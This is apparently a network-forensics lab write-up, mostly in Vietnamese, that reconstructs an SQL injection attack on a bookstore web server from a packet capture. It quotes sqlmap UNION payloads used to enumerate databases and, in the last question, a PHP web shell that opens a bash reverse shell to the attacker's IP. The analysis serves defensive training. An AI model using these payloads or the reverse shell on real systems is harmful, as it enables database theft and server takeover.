author: Azaki
published: published
created: 2026-01-06
tags: CyberDefener, Lab, Network Forensics

You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.
Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.
As the lead analyst in this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

<hr>
<p style="text-align:right; font-style:italic;">
  Author: <b>@CyberDefender</b> 
</p>

## Q1: By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?

**Yêu cầu:** Xác định địa chỉ IP của attacker từ network traffic.

Đầu tiên, mở file PCAP bằng **Wireshark** và vào:
```
Statistics → Conversations → IPv4
```

Tại đây có thể quan sát các cặp IP trao đổi lưu lượng với nhau. Cặp `111.224.250.131` và `73.124.22.98` có lượng traffic vượt trội so với các conversation còn lại
![Web Investigation Lab-1.png](./images/Web%20Investigation%20Lab-1.png)

Tuy nhiên, chỉ có nhiều packet nhất chưa đủ để kết luận một IP là attacker. Khi kiểm tra các HTTP request sau đó, có thể thấy `111.224.250.131` là phía chủ động gửi các request chứa SQL Injection tới web server `73.124.22.98`, trong khi server gửi HTTP response ngược lại.
![Web Investigation Lab-2.png](./images/Web%20Investigation%20Lab-2.png)

>111.224.250.131

## Q2: If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?

**Yêu cầu:** Xác định thành phố được liên kết với địa chỉ IP của attacker.

Sau khi có IP `111.224.250.131`, sử dụng `whois` để kiểm tra thông tin đăng ký của IP/netblock:
```
whois 111.224.250.131
```

Trong kết quả WHOIS/APNIC, phần contact information hiển thị địa chỉ:
```
No.69 Kunlun avenue, Shijiazhuang 050000 China
```

![Web Investigation Lab-3.png](./images/Web%20Investigation%20Lab-3.png)

>Shijiazhuang

## Q3: Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable PHP script name?

**Yêu cầu:** Xác định PHP script bị attacker khai thác.

Tiếp tục phân tích HTTP traffic. Có thể sử dụng filter để tập trung vào request từ IP của attacker:
```
ip.src == 111.224.250.131 && http.request
```

Trong kết quả xuất hiện rất nhiều request tới:
```
/search.php
```

Đáng chú ý hơn, query parameter `search` chứa nhiều payload có dấu hiệu SQL Injection như:
```
search=book and 1=1
search=book'
UNION SELECT ...
```

![Web Investigation Lab-4.png](./images/Web%20Investigation%20Lab-4.png)

Như vậy không chỉ vì `search.php` xuất hiện nhiều lần, mà chính parameter của script này đang được attacker chèn SQL payload để thao tác database

>search.php

## Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, what is the complete request URI of the first SQLi attempt by the attacker?

**Yêu cầu:** Xác định complete Request URI của lần thử SQL Injection đầu tiên.

Sau khi xác định `search.php` là endpoint bị khai thác, lọc các HTTP request liên quan và kiểm tra theo thứ tự thời gian.

Một trong những SQL Injection probe đầu tiên được gửi tới server là:
```
GET /search.php?search=book and 1=1; -- - HTTP/1.1
```

![Web Investigation Lab-5.png](./images/Web%20Investigation%20Lab-5.png)

Payload:
```
1=1
```
là một biểu thức luôn đúng, thường được sử dụng để kiểm tra xem input của ứng dụng có thể làm thay đổi logic của SQL query hay không. Phần `-- -` đóng vai trò comment phần còn lại của câu SQL trong trường hợp backend sử dụng cú pháp tương thích.

>/search.php?search=book and 1=1; -- -

## Q5: Can you provide the complete request URI that was used to read the web server's available databases?

**Yêu cầu:** Xác định SQL Injection request được attacker sử dụng để enumerate các database có trên web server.

Sau khi xác nhận parameter có thể bị SQL Injection, attacker chuyển sang sử dụng các UNION-based payload để đọc metadata của database.

Có thể tìm trong packet bằng các keyword như:
```
INFORMATION_SCHEMA
SCHEMATA
schema_name
UNION
```

Trong HTTP request có thể thấy `User-Agent`:
```
sqlmap/1.8.3#stable
```

và payload truy vấn:
```
FROM INFORMATION_SCHEMA.SCHEMATA
```

![Web Investigation Lab-6.png](./images/Web%20Investigation%20Lab-6.png)

`INFORMATION_SCHEMA.SCHEMATA` chứa metadata về các schema/database mà database server biết tới. Vì vậy query này được sử dụng để enumerate danh sách database

>/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -

## Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?

**Yêu cầu:** Xác định table chứa dữ liệu người dùng của website.

Sau khi enumerate database, attacker tiếp tục truy vấn `INFORMATION_SCHEMA` để xác định table và column bên trong database của ứng dụng.

Trong một request có thể thấy điều kiện:
```
WHERE table_name=0x637573746f6d657273
AND table_schema=0x626f6f6b776f726c645f6462
```

![Web Investigation Lab-7.png](./images/Web%20Investigation%20Lab-7.png)

Hai giá trị này đang được biểu diễn dưới dạng hexadecimal.

Decode bằng CyberChef với recipe **From Hex**
![Web Investigation Lab-8.png](./images/Web%20Investigation%20Lab-8.png)

Kết quả:
```
customers
```

Tương tự:
```
626f6f6b776f726c645f6462
```

decode thành:
```
bookworld_db
```

Như vậy attacker đang enumerate các column của table `customers` thuộc database `bookworld_db`

>customers

## Q7: The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide the name of the directory discovered by the attacker?

**Yêu cầu:** Xác định hidden directory mà attacker đã tìm thấy và truy cập.

Tiếp tục theo dõi HTTP activity từ attacker. Có thể sử dụng filter:
```
ip.src == 111.224.250.131 && http.request.uri contains "/admin/"
```

Hoặc tập trung vào các POST request:
```
http.request.method == POST
```

Kết quả cho thấy attacker liên tục tương tác với:
```
/admin/login.php
```

và sau đó:
```
/admin/index.php
```

![Web Investigation Lab-9.png](./images/Web%20Investigation%20Lab-9.png)
>/admin/

## Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?

**Yêu cầu:** Xác định username và password được attacker sử dụng để đăng nhập vào admin panel.

Sau khi xác định `/admin/`, tiếp tục kiểm tra các POST request tới:
```
/admin/login.php
```

Trong Wireshark, mở phần:
```
HTML Form URL Encoded
```
để xem dữ liệu được gửi qua login form.

Ở một trong các request có thể thấy:
```
username = admin
password = admin123!
```

![Web Investigation Lab-10.png](./images/Web%20Investigation%20Lab-10.png)

Sau chuỗi login activity này, attacker tiếp tục tương tác với `/admin/index.php`, cho thấy administrative access đã được sử dụng trong giai đoạn tiếp theo của cuộc tấn công.

>admin:admin123!

## Q9: We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?

**Yêu cầu:** Xác định tên malicious PHP script được attacker upload lên web server.

Sau khi attacker có quyền truy cập admin panel, kiểm tra POST request tới:
```
/admin/index.php
```

Request sử dụng:
```
Content-Type: multipart/form-data
```
đây là dạng request thường xuất hiện khi upload file.

Khi follow HTTP stream, trong trường `Content-Disposition` có:
```
name="fileToUpload"; filename="NVri2vhp.php"
```

![Web Investigation Lab-11.png](./images/Web%20Investigation%20Lab-11.png)

Nội dung file cũng cho thấy đây không phải file PHP thông thường:
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>
```

Script sử dụng PHP `exec()` để gọi `/bin/bash` và tạo outbound reverse shell quay về:
```
111.224.250.131:443
```

Địa chỉ này trùng với attacker IP đã xác định ở Q1, củng cố việc đây là malicious payload dùng để giành quyền điều khiển ở mức hệ điều hành sau khi web application bị compromise

>NVri2vhp.php

---

# ATTACK CHAIN

![Web Investigation Lab.png](./images/Web%20Investigation%20Lab.png)